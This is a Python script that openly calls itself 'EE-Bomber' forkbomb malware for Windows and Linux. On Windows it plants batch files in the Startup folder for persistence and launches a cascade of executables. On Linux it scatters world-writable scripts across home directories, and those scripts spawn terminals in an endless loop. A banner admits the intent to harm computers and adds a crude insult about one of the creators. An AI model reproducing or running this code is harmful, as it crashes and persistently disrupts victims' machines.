import os
import subprocess
import platform
import getpass
import random
import string



# Verion 7.0
username = getpass.getuser()
userid ="C:\\Users\\"
cdrive ="C:\\"
home = '/home/'
alldrives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]
filelimit = "test"

script = ("""
import os
import subprocess
import syspip install regex
import platform
import getpass
import resource
username = getpass.getuser()
home = "/home/"
filelimit = resource.getrlimit(resource.RLIMIT_NOFILE)
location = ('""")

script2 = ("""')
total = (str(home)+str(username)+str(location))
for x in range(filelimit[1]):
    f = open((str(total)+str(x)+'.sh'),"w+")
    os.chmod((str(total)+str(x)+'.sh'), 0o777)
    f.write(\"\"\"
    for ((; ;))
    do 
    gnome-terminal
    done\"\"\")
    subprocess.Popen((str(total)+str(x)+'.sh'), shell=True)""")


#oschecker
def oschecker(os):
    os = (platform.system()).upper()
    if os == 'WINDOWS':
        windows(os)
    elif os == 'LINUX':
        linux(os)


def windows(o):               
        
        def initiator(x):
                x = random.randint(348394,999999)
                startupfolder = (R"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\")
                total = str(userid) + str('!') + str(username) + str(startupfolder)
                try:
                        f = open((str(total)+str(x)+'.bat'),"+w")
                        f.write(R"""
                        @echo off

                        :startup
                        cd /d "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
                        for %%a in (*.bat) do call "%%a"
                        goto temp

                        :temp
                        cd /d "C:\Users\%USERNAME%\AppData\Local\Temp"
                        for %%a in (*.bat) do call"%%a"
                        goto desktop

                        :document
                        cd /d "C:\Users\%USERNAME%\Documents"
                        for %%a in (*.bat) do call"%%a"
                        goto pictures

                        :pictures
                        cd /d "C:\Users\%USERNAME%\Pictures"
                        for %%a in (*.bat) do call"%%a"
                        goto music

                        :Music
                        cd /d "C:\Users\%USERNAME%\Music"
                        for %%a in (*.bat) do call"%%a"
                        goto videos

                        :videos
                        cd /d "C:\Users\%USERNAME%\Videos"
                        for %%a in (*.bat) do call"%%a"
                        goto downloads

                        :downloads
                        cd /d "C:\Users\%USERNAME%\Downloads"
                        for %%a in (*.bat) do call"%%a"

                        :desktop
                        cd /d "C:\Users\%USERNAME%\Downloads"
                        for %%a in (*.bat) do call"%%a"
                        
                        :desktop
                        cd /d "C:\Users\%USERNAME%\Downloads"
                        for %%a in (*.bat) do call"%%a"


                                """)
                        f.close
                        subprocess.Popen((str(total)+str(x))+'.bat', shell=True)
                        copyme(x)
                except:
                        copyme(x)
                
        def copyme(x):
                try:
                        g = random.randint(348394,999999)
                        total = str(g) + str('!') 
                        x = open((str(total)+'.bat'),"+w")
                        x.write(R"""
                        @echo off
                        xcopy "EE_Bomber.exe" "%Appdata%\Microsoft\Windows\Start Menu\Programs\Startup" /y
                        pushd %~dp0
                        """)
                        x.close
                        subprocess.Popen('74939!4.bat', shell=True)
                        executor(x)
                except:
                        executor(x)
                
        def executor(x):
                x = open(("4375934!.bat"),"+w")
                x.write(R"""
                @echo off
                start CSIstartup.exe
                start D-drive.exe
                start CSIdocuments.exe
                start CSIvideos.exe
                start CSIdesktop.exe 
                start CSIdownloads.exe
                start CSImusic.exe
                start CSIpictures.exe
                start CSI3Dobjects.exe 
                start CSIpublicdocuments.exe
                start CSIpublicdownload.exe
                start CSIPublicmusic.exe
                start CSIpublicpictures.exe
                start CSIpublicsecurity.exe
                start CSIpublicspeed.exe
                start CSIpublicvideo.exe
                start CSItemp.exe
                """)
                x.close
                subprocess.Popen('4375934!.bat', shell=True)
                executordrive(x)
                
        def executordrive(x):
                x = open(("9375934!.bat"),"+w")
                x.write(R"""
                @echo off
                start E-drive.exe
                start F-drive.exe
                start G-drive.exe
                start H-drive.exe
                start i-drive.exe
                start J-drive.exe
                start K-drive.exe
                start L-drive.exe
                start M-drive.exe
                start N-drive.exe
                start O-drive.exe
                start P-drive.exe
                start Q-drive.exe
                start R-drive.exe
                start S-drive.exe
                """)
                x.close
                subprocess.Popen('9375934!.bat', shell=True)
                   
        initiator(o)

def linux(x):
        def csildesktopinitiator(x): #good
                location = ("/Desktop/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        csildocumentsinitiator(x)
                else:
                        csildocumentsinitiator(x)


        def csildocumentsinitiator(x): #good
                location = ("/Documents/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        csildownloadsinitiator(x)  
                else:
                        csildownloadsinitiator(x)


        def csildownloadsinitiator(x): #good
                location = ("/Downloads/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        csilpicturesinitiator(x)
                else:
                        csilpicturesinitiator(x)


        def csilpicturesinitiator(x): #good
                location = ("/Pictures/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        csilvideosinitiator(x)
                else:
                        csilvideosinitiator(x)
        
        
        def csilvideosinitiator(x): #good
                location = ("/Videos/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        csilmusicinitiator(x)
                else:
                        csilmusicinitiator(x)


        def csilmusicinitiator(x): #good
                location = ("/Music/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        csilpublicinitiator(x)
                else:  
                        csilpublicinitiator(x)


        def csilpublicinitiator(x): #good
                location = ("/Public/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        csiltemplatesinitiator(x)
                else:    
                        csiltemplatesinitiator(x)   


        def csiltemplatesinitiator(x): #good
                location = ("/Templates/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        csillocalinitiator(x)
                else:  
                        csillocalinitiator(x) 


        def csillocalinitiator(x): #good
                location = ("/.local/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        csilshareinitiator(x)
                else:
                        csilshareinitiator(x)


        def csilshareinitiator(x):  #share
                location = ("/.local/share/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        csiltrashinitiator(x)
                else:
                        csiltrashinitiator(x)


        def csiltrashinitiator(x): #good
                location = ("/.local/share/Trash/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        csiltrashsinitiator(x)
                else:
                        csiltrashsinitiator(x)


        def csiltrashsinitiator(x): #good
                location = ("/.local/share/Trash/files/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        csilcacheinitiator(x)
                else:
                        csilcacheinitiator(x)


        def csilcacheinitiator(x): #good
                location = ("/.cache/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        csilconfiginitiator(x)
                else:
                        csilconfiginitiator(x)
                
                
        def csilconfiginitiator(x): #good
                location = ("/.config/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        csilsnapinitiator(x)
                else:
                        csilsnapinitiator(x)
        
                
        def csilsnapinitiator(x): #good
                location = ("/snap/")
                total = (str(home)+str(username)+str(location))
                if os.path.exists(total):
                        x = ("file")
                        f = open((str(total)+str(x)+'.py'),"w+")
                        os.chmod((str(total)+str(x)+'.py'), 0o777)
                        f.write(str(script)+str(location)+str(script2))
                        f.close()
                        startinginitiator(x)
                else:
                    startinginitiator(x)
                            
        def startinginitiator(x):
                global username
                os.system("python3 /home/"+str(username)+"/Desktop/file.py && python3 /home/"+str(username)+"/Documents/file.py && python3 /home/"+str(username)+"/Videos/file.py && python3 /home/"+str(username)+"/Pictures/file.py && python3 /home/"+str(username)+"/Template/file.py && python3 /home/"+str(username)+"/Public/file.py")

        csildesktopinitiator(x)
        
def question2(x):
        x = input("type the Pa$$w0rd to accept: ")
        if x == 'YES':
                oschecker(x)
        else:
                question2(x)

terms = print("""
#####################################################################
                    Welcome to EE-Bomber!
BirdPooper is a forkbomber type malware that can harm both Windows 
and Linux OS! We created this for fun and to better understand Python.
We highly recommend you to use this on a Virtual machine only! We
will not be responsible for any harm or damages done on to you or 
anyone's computers. Use this at your risk! You have been warned!
By executing this scipt you agree with our warning.
by the way Password: YES

~Creators: MAshirorororo & Sudoindividual <- he is gay
#####################################################################
                 """)
question2(terms)